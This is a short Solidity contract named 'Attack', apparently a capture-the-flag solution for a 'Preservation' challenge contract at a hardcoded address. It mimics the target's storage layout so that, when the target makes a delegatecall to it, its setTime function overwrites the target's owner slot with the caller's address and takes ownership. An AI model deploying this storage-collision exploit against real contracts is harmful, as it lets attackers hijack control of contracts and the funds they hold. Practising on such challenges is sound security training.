pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    address decoy;
    address decoy_two;
    address storedTime;
    Preservation preserve =
        Preservation(0x37318258F79Bd0275AAd1714ca4119732c1a0F0D);

    function setTime(uint256 _time) public {
        storedTime = msg.sender;
    }
}
